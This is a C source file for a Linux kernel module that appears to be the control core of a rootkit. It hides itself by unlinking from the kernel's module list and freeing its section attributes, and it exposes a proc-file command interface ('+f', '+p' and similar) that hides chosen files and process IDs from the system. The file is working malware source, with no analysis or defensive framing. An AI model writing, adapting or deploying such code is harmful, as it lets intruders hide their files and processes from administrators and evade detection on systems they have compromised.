#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>

#include <linux/fs.h>
#include <linux/file.h>
#include <linux/string.h>

#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/sysfs.h>

#include "config.h"
#include "rproc.h"
#include "rfile.h"


struct list_head *mode_prev;
static struct list_head *_kobj_prev;
struct kobject *kobject_prev;
struct kobject *_parent_prev;
static int mod_hide = 0;

void hide(void)
{
	if (mod_hide == 1)
	{
		return;
	}

	mode_prev = THIS_MODULE->list.prev;
	
	kobject_prev = &THIS_MODULE->mkobj.kobj;
	_parent_prev = THIS_MODULE->mkobj.kobj.parent;

	list_del(&THIS_MODULE->list); //procfs view
	
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;

	_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;


	mod_hide = !mod_hide;
}

void show(void)
{
	if (!mod_hide)
		return;

	list_add(&THIS_MODULE->list, mode_prev);

	mod_hide = !mod_hide;
}


static int _status = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
static ssize_t proc_path_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
#else
static ssize_t proc_path_write(struct file *file, const char __user *buffer, unsigned long count, void *data)
#endif
{
	char _input[1024+1] = {0};
	char *user_dat;

	if (count > 0 && count < 1024)
	{
		user_dat = kmalloc(1024 + 1, GFP_KERNEL);
		if ( ! user_dat )
		   return -EFAULT;
		
		if (copy_from_user(_input, buffer, count))
		{
			return -EFAULT;
		}
		_input[count-1] = 0;
		_input[count] = 0;


		// +f		add file
		if(_input[0] == '+' && _input[1] == 'f'){
			strncpy(user_dat, _input+2, count-2);

			file_hide(user_dat);
		}
		
		// -f		delete file
		if(_input[0] == '-' && _input[1] == 'f'){
			strncpy(user_dat, _input+2, count-2);

			file_unhide(user_dat);
		}
		
		// +p		add pid
		if(_input[0] == '+' && _input[1] == 'p'){
			strncpy(user_dat, _input+2, count-2);

			char *endp;
			long _pid = simple_strtoul(user_dat, &endp, 10);

			pid_hide(_pid);
			
			kfree(user_dat);
		}
		
		// -p		delete pid
		if(_input[0] == '-' && _input[1] == 'p'){
			strncpy(user_dat, _input+2, count-2);
			
			char *endp;
			long _pid = simple_strtoul(user_dat, &endp, 10);

			pid_unhide(_pid);
			
			kfree(user_dat);
		}

		// dm		show mod
		if(strncmp(_input, "dm", 2) == 0)
		{
			show();
			
			_status = 1;
			
			kfree(user_dat);
		}

	}	

	return count;
}

static int proc_path_show(struct seq_file *seq, void *v)
{
	seq_puts(seq, _status ? "true\n" : "false\n");

	return 0;
}

static int proc_path_open(struct inode *inode, struct file *file)
{
	return single_open(file, proc_path_show, NULL);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
// 新内核使用proc_ops
static const struct proc_ops proc_path_proc_ops = {
	.proc_open = proc_path_open,
	.proc_read = seq_read,
	.proc_write = proc_path_write,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};
#endif

static const struct file_operations proc_path_fops = {
	.owner = THIS_MODULE,
	.open = proc_path_open,
	.read = seq_read,
	.write = proc_path_write,
	.llseek = seq_lseek,
	.release = single_release,
};

static struct proc_dir_entry *this_proc;
int proc_path_init(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
	this_proc = proc_create(CTL_PROC_NAME, 0, NULL, &proc_path_proc_ops);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
	this_proc = proc_create(CTL_PROC_NAME, 0, NULL, &proc_path_fops);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}
#else
	this_proc = create_proc_entry(CTL_PROC_NAME, 0644, NULL);
	if (NULL == this_proc)
	{
		return -ENOMEM;
	}

	this_proc->write_proc = proc_path_write;

#endif

	return 0;
}

void proc_path_exit(void)
{
	if (this_proc)
		remove_proc_entry(CTL_PROC_NAME, NULL);
}
